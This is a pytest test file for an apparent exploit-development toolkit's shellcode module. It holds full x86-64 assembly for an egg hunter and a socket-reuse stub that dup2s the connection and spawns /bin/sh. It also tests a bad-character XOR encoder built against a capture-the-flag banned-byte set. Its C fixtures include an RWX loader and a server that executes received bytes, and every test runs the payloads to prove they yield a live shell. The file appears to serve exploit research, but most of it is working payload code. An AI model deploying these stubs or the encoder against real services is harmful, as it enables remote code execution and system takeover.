"""Shellcode for the two constraints a 25-byte `execve` does not answer.

* **The executable buffer is too small.** `egg_hunter` goes in the small one and `egg()` in
  whatever channel has room -- an environment variable, argv, a heap copy of a file -- and no
  address has to be known by either side.
* **The target is on a network.** `execve_binsh` spawns a shell on the service's own stdio, which
  goes to a log or /dev/null; `find_socket_execve_binsh` finds the connected socket and dup2's it,
  so the shell comes back the way the overflow came in.

Every stub here was assembled with `as --64` and the bytes in the module are asserted against that
assembly, so a hand-encoding slip is a test failure rather than a silent segfault.
"""
import os
import re
import shutil
import signal
import socket
import subprocess
import time

import pytest
from lykos.analyze.dynamic import sandbox
from lykos.analyze.poc import shellcode

pytestmark = pytest.mark.skipif(
    sandbox.host_arch() != "x86-64" or not shutil.which("gcc"),
    reason="the stubs are x86-64 and the proofs run them natively")

#: Loads a blob into an RWX mapping and calls it. Deliberately generous, so an egg hunter has
#: somewhere to walk.
_RUNNER = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
int main(int argc, char **argv){
  FILE *f = fopen(argv[1], "rb"); if(!f) return 1;
  static unsigned char buf[4194304];
  size_t n = fread(buf, 1, sizeof buf, f); fclose(f);
  size_t len = (n + 0xfff) & ~0xfffUL;
  void *pg = mmap(0, len + 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC,
                  MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if(pg == MAP_FAILED) return 1;
  memcpy(pg, buf, n);
  ((void(*)(void))pg)();
  return 0; }
"""

#: A forking server that mmaps the connection's first bytes, makes them executable and CALLS
#: them -- so the only way anything comes back is the socket itself.
_SRV = r"""
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
static void handle(int fd){
  char b[512]; ssize_t n = read(fd, b, sizeof b); if(n <= 0) return;
  void *pg = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if(pg == MAP_FAILED) return;
  memcpy(pg, b, n); mprotect(pg, 0x1000, PROT_READ|PROT_EXEC);
  ((void(*)(void))pg)();
}
int main(void){ setvbuf(stdout,0,2,0);
  signal(SIGCHLD, SIG_IGN);
  int s = socket(AF_INET, SOCK_STREAM, 0);
  int one=1; setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&one,sizeof one);
  struct sockaddr_in a; memset(&a,0,sizeof a);
  a.sin_family=AF_INET; a.sin_addr.s_addr=htonl(INADDR_LOOPBACK); a.sin_port=0;
  if(bind(s,(void*)&a,sizeof a)) return 1;
  socklen_t l=sizeof a; getsockname(s,(void*)&a,&l);
  /* listen BEFORE announcing the port: a client that connects first gets ECONNREFUSED */
  listen(s,16); printf("port %d\n", ntohs(a.sin_port));
  for(;;){ int c=accept(s,0,0); if(c<0) continue;
           if(fork()==0){ close(s); handle(c); _exit(0); } close(c); } }
"""


def _cc(tmp_path, src, name):
    gcc = shutil.which("gcc") or shutil.which("cc")
    (tmp_path / f"{name}.c").write_text(src)
    exe = tmp_path / name
    if subprocess.run([gcc, "-O0", "-w", str(tmp_path / f"{name}.c"), "-o", str(exe)],
                      capture_output=True).returncode:
        pytest.skip(f"cannot build the {name} fixture")
    return exe


def _assembles_to(src: str, tmp_path) -> bytes:
    """Assemble `src` with the system assembler and return its .text, so the bytes in the module
    are checked against a real assembler rather than against themselves."""
    if not (shutil.which("as") and shutil.which("objcopy")):
        pytest.skip("no binutils")
    (tmp_path / "a.s").write_text(src)
    if subprocess.run(["as", "--64", "-o", str(tmp_path / "a.o"), str(tmp_path / "a.s")],
                      capture_output=True).returncode:
        pytest.skip("assembly failed")
    subprocess.run(["objcopy", "-O", "binary", "--only-section=.text",
                    str(tmp_path / "a.o"), str(tmp_path / "a.bin")], check=True)
    return (tmp_path / "a.bin").read_bytes()


# --------------------------------------------------------------------------------- the egg hunter
def test_egg_hunter_matches_the_assembler(tmp_path):
    asm = """
.intel_syntax noprefix
.text
_start:
    lea rdx, [rip]
next_addr:
    inc rdx
    lea rdi, [rdx+8]
    push 21
    pop rax
    xor esi, esi
    syscall
    cmp al, 0xf2
    je next_page
    mov eax, 0x54303057
    mov rdi, rdx
    scasd
    jne next_addr
    scasd
    jne next_addr
    jmp rdi
next_page:
    or dx, 0xfff
    jmp next_addr
"""
    assert shellcode.egg_hunter() == _assembles_to(asm, tmp_path)


def test_egg_hunter_shape():
    h = shellcode.egg_hunter()
    assert len(h) == 48
    assert shellcode.EGG_TAG in h                        # once, in `mov eax, tag`
    assert h.count(shellcode.EGG_TAG) == 1, "the tag must not appear doubled inside the hunter"
    with pytest.raises(ValueError):
        shellcode.egg_hunter(b"TOOLONG")


def test_egg_puts_the_doubled_tag_in_front():
    body = shellcode.execve_binsh()
    e = shellcode.egg(body)
    assert e[:8] == shellcode.EGG_TAG * 2
    assert e[8:] == body
    assert shellcode.egg(body, b"ABCD")[:8] == b"ABCDABCD"
    with pytest.raises(ValueError):
        shellcode.egg(body, b"AB")


@pytest.mark.parametrize("gap", [0x100, 0x4000, 0x100000])
def test_egg_hunter_finds_a_payload_at_any_distance(tmp_path, gap):
    """The capability: the hunter is 48 bytes and the payload can be anywhere above it. 0x100000
    is the case that found the page-boundary bug -- the 8-byte compare window straddled into
    unmapped memory and the probe had passed on its first byte."""
    runner = _cc(tmp_path, _RUNNER, "runner")
    blob = bytearray(gap + 64)
    h = shellcode.egg_hunter()
    blob[0:len(h)] = h
    e = shellcode.egg(shellcode.execve_binsh())
    blob[gap:gap + len(e)] = e
    (tmp_path / "b.bin").write_bytes(bytes(blob))
    p = subprocess.run([str(runner), str(tmp_path / "b.bin")],
                       input=b"echo EGG-SHELL-OK\nexit\n", capture_output=True, timeout=60)
    assert b"EGG-SHELL-OK" in p.stdout, (p.returncode, p.stdout[-200:], p.stderr[-200:])


def test_egg_hunter_finds_nothing_when_the_tag_is_broken(tmp_path):
    """The control. Without it, a hunter that happened to land on the payload by accident would
    look identical to one that searched."""
    runner = _cc(tmp_path, _RUNNER, "runner")
    blob = bytearray(0x1000 + 64)
    h = shellcode.egg_hunter()
    blob[0:len(h)] = h
    broken = b"X00T" + shellcode.EGG_TAG + shellcode.execve_binsh()
    blob[0x1000:0x1000 + len(broken)] = broken
    (tmp_path / "b.bin").write_bytes(bytes(blob))
    try:
        p = subprocess.run([str(runner), str(tmp_path / "b.bin")],
                           input=b"echo EGG-SHELL-OK\nexit\n", capture_output=True, timeout=20)
        assert b"EGG-SHELL-OK" not in p.stdout
    except subprocess.TimeoutExpired:
        pass                                             # still walking: also "found nothing"


# ------------------------------------------------------------------------------ the socket stubs
def test_find_socket_matches_the_assembler(tmp_path):
    asm = """
.intel_syntax noprefix
.text
_start:
    xor edi, edi
next_fd:
    lea rsi, [rsp-0x80]
    lea rdx, [rsp-0x88]
    mov dword ptr [rdx], 0x80
    push 52
    pop rax
    syscall
    test eax, eax
    je found
    inc edi
    cmp edi, 0x100
    jne next_fd
    push 60
    pop rax
    syscall
found:
    xor esi, esi
dup_loop:
    push 33
    pop rax
    syscall
    inc esi
    cmp esi, 3
    jne dup_loop
    xor esi, esi
    xor edx, edx
    movabs rbx, 0x0068732f6e69622f
    push rbx
    mov rdi, rsp
    push 59
    pop rax
    syscall
"""
    assert shellcode.find_socket_execve_binsh() == _assembles_to(asm, tmp_path)


def test_socket_stub_sizes_and_argument_checks():
    assert len(shellcode.find_socket_execve_binsh()) == 82
    assert len(shellcode.dup2_execve_binsh(4)) == 40
    assert b"/bin/sh" in shellcode.dup2_execve_binsh(4)
    assert shellcode.dup2_execve_binsh(0x10)[1] == 0x10
    with pytest.raises(ValueError):
        shellcode.dup2_execve_binsh(0x200)               # does not fit a push imm8
    with pytest.raises(ValueError):
        shellcode.find_socket_execve_binsh(0)


def test_find_socket_spawns_a_shell_on_the_connection(tmp_path):
    """The whole point: a network-delivered payload whose shell talks back over the same socket,
    with no reverse connection and no second channel. The int3 control at the same length is what
    makes the marker mean execution -- a server that merely echoed its input would pass without it."""
    srv = _cc(tmp_path, _SRV, "srv")
    proc = subprocess.Popen([str(srv)], stdout=subprocess.PIPE, start_new_session=True)
    try:
        line = proc.stdout.readline()
        m = re.search(rb"port (\d+)", line or b"")
        if not m:
            pytest.skip("server never announced a port")
        port = int(m.group(1))

        def shot(payload):
            s = socket.socket()
            s.settimeout(2.0)
            try:
                s.connect(("127.0.0.1", port))
                s.sendall(payload)
                time.sleep(0.25)
                s.sendall(b"id; echo SOCK-REUSE-OK\n")
                out = b""
                try:
                    while True:
                        b = s.recv(4096)
                        if not b:
                            break
                        out += b
                except socket.timeout:
                    pass
                return out
            except OSError:
                return b""
            finally:
                s.close()

        sc = shellcode.find_socket_execve_binsh()
        assert b"SOCK-REUSE-OK" in shot(sc), "no shell came back over the socket"
        assert b"SOCK-REUSE-OK" not in shot(b"\xcc" * len(sc)), \
            "the int3 control came back with a marker, so the target echoes its input"
    finally:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:                                # noqa: BLE001
            pass


# ------------------------------------------------------- the new stubs compose with the bad-char
#: HTB execute's real banned set, the one this encoder was originally built against.
_HTB_BAD = bytes({0x3B, 0x54, 0x62, 0x69, 0x6E, 0x73, 0x68, 0xF6, 0xD2, 0xC0, 0x5F, 0xC9,
                  0x66, 0x6C, 0x61, 0x67})


@pytest.mark.parametrize("label,bad", [
    ("nul-and-newline", b"\x00\x0a"),
    ("line-reader", b"\x00\x0a\x0d\x20\x2f"),
    ("htb", _HTB_BAD),
    ("htb-plus-nul", _HTB_BAD + b"\x00\x0a"),
])
def test_every_stub_encodes_against_every_real_banned_set(label, bad):
    """A filtered channel is orthogonal to which stub is being delivered, so the encoder has to
    wrap all of these. `{0x00, 0x0a}` is the case that could not be satisfied at all before: the
    old `lea rsi, [rip+N]` get-PC wrote three NUL bytes into the decoder's own displacement, and
    `exploit_stage` asks for exactly that set for a line-reading sink."""
    for stub in (shellcode.execve_binsh(), shellcode.find_socket_execve_binsh(),
                 shellcode.dup2_execve_binsh(4), shellcode.egg_hunter()):
        enc = shellcode.encode_avoiding(stub, bad)
        assert enc is not None, f"{label}: nothing in the key x padding space worked"
        assert not (set(enc) & set(bad)), f"{label}: a banned byte survived"
        assert shellcode._STUB1 <= len(enc) - len(stub) <= shellcode._STUB4 + 3


def test_the_encoder_still_refuses_what_is_genuinely_impossible():
    """Banning a byte the stub cannot avoid (REX.W) is unsatisfiable by any key or padding, and the
    honest answer is None rather than a blob that will not run."""
    assert shellcode.encode_avoiding(shellcode.execve_binsh(), b"\x48") is None
    assert shellcode.encode_avoiding(b"", b"") is None
    assert shellcode.encode_avoiding(b"\x90" * 256, b"") is None   # the length goes in dl


def test_a_long_payload_does_not_sign_extend_its_length():
    """`push imm8; pop rcx` sign-extends, so a payload of 128 bytes or more used to set rcx to
    ~2^64 and the decode loop ran over the address space. The length now goes in `dl`."""
    for n in (120, 128, 200, 255):
        enc = shellcode.encode_avoiding(b"\x90" * n, b"\x00")
        assert enc is not None, n
        assert bytes([n]) in enc, "the length immediate is not in the stub"


def test_the_rolling_key_decoder_runs(tmp_path):
    """The 4-byte decoder proved by EXECUTION, with a known key, because it is reached only when
    the single-byte search fails and would otherwise be untested on the path that matters."""
    runner = _cc(tmp_path, _RUNNER, "runner")
    payload = shellcode.execve_binsh()
    seq = (0x11, 0x22, 0x33, 0x44)
    enc = bytes(b ^ seq[i % 4] for i, b in enumerate(payload))
    blob = shellcode._decoder4(len(enc), seq) + enc
    (tmp_path / "b.bin").write_bytes(blob)
    p = subprocess.run([str(runner), str(tmp_path / "b.bin")],
                       input=b"echo ROLL4-OK\nexit\n", capture_output=True, timeout=30)
    assert b"ROLL4-OK" in p.stdout, (p.returncode, p.stdout[-200:])


@pytest.mark.parametrize("bad", [b"\x00\x0a", _HTB_BAD, _HTB_BAD + b"\x00\x0a"])
def test_the_encoded_execve_actually_decodes_and_spawns_a_shell(tmp_path, bad):
    """The encoder is hand-encoded, so the only check that counts is running it."""
    runner = _cc(tmp_path, _RUNNER, "runner")
    enc = shellcode.encode_avoiding(shellcode.execve_binsh(), bad)
    assert enc and not (set(enc) & set(bad))
    (tmp_path / "b.bin").write_bytes(enc)
    p = subprocess.run([str(runner), str(tmp_path / "b.bin")],
                       input=b"echo ENC-SHELL-OK\nexit\n", capture_output=True, timeout=30)
    assert b"ENC-SHELL-OK" in p.stdout, (p.returncode, p.stdout[-200:])
